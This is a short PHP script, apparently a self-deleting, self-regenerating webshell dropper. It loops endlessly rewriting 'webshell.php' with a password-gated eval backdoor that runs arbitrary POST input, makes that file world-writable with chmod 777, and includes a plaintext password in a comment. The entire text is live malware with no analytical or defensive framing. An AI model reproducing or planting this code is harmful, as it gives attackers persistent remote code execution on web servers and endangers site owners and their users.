<?php  
//密码 i4mhmh!
    set_time_limit(0);  
    ignore_user_abort(1);  
    unlink(__FILE__);  
    while(1){  
        file_put_contents('webshell.php','<?php if(md5($_POST["passwd"])== "5ba67c7457b51f018d85a1b87a808022")
			@eval($_POST["a"]);?>');  
        usleep(1);  /*nice啊马飞*/
		system('chmod 777 webshell.php');
    };
?>